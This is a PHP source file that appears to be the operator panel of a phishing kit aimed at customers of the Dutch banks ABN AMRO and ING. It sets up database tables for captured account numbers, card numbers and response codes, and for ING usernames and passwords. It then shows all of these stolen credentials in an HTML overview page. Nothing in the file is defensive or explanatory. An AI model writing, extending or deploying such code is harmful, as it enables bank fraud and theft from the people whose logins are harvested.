<?php
// Maak verbinding met de database
$db = new PDO('sqlite:' . __DIR__ . '/data.db');
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

// ABN AMRO tabel (bestaande tabel)
$db->exec("CREATE TABLE IF NOT EXISTS logins (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    rekeningnummer TEXT,
    pasnummer TEXT,
    respons TEXT,
    respons2 TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");
$stmt = $db->query("SELECT * FROM logins ORDER BY created_at DESC");
$logins = $stmt->fetchAll(PDO::FETCH_ASSOC);

// ING tabel: maak de tabel als deze niet bestaat en haal de data op
$db->exec("CREATE TABLE IF NOT EXISTS ing_logins (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT,
    password TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");
$stmt2 = $db->query("SELECT * FROM ing_logins ORDER BY created_at DESC");
$ing_logins = $stmt2->fetchAll(PDO::FETCH_ASSOC);
?>
<!DOCTYPE html>
<html lang="nl">
<head>
  <meta charset="UTF-8">
  <title>Gegevens Overzicht</title>
  <style>
    table { border-collapse: collapse; width: 100%; margin-bottom: 40px; }
    th, td { border: 1px solid #ccc; padding: 8px; text-align: left; }
    h1, h2 { font-family: Arial, sans-serif; }
  </style>
</head>
<body>
  <h1>ABN AMRO</h1>
  <table>
    <thead>
      <tr>
        <th>ID</th>
        <th>Rekeningnummer</th>
        <th>Pasnummer</th>
        <th>Respons</th>
        <th>Respons 2</th>
        <th>Aanmaakdatum</th>
      </tr>
    </thead>
    <tbody>
      <?php foreach($logins as $login): ?>
      <tr>
        <td><?= htmlspecialchars($login['id']) ?></td>
        <td><?= htmlspecialchars($login['rekeningnummer']) ?></td>
        <td><?= htmlspecialchars($login['pasnummer']) ?></td>
        <td><?= htmlspecialchars($login['respons']) ?></td>
        <td><?= htmlspecialchars($login['respons2']) ?></td>
        <td><?= htmlspecialchars($login['created_at']) ?></td>
      </tr>
      <?php endforeach; ?>
    </tbody>
  </table>

  <h1>ING</h1>
  <table>
    <thead>
      <tr>
        <th>ID</th>
        <th>Gebruikersnaam</th>
        <th>Wachtwoord</th>
        <th>Aanmaakdatum</th>
      </tr>
    </thead>
    <tbody>
      <?php foreach($ing_logins as $ing): ?>
      <tr>
        <td><?= htmlspecialchars($ing['id']) ?></td>
        <td><?= htmlspecialchars($ing['username']) ?></td>
        <td><?= htmlspecialchars($ing['password']) ?></td>
        <td><?= htmlspecialchars($ing['created_at']) ?></td>
      </tr>
      <?php endforeach; ?>
    </tbody>
  </table>
</body>
</html>
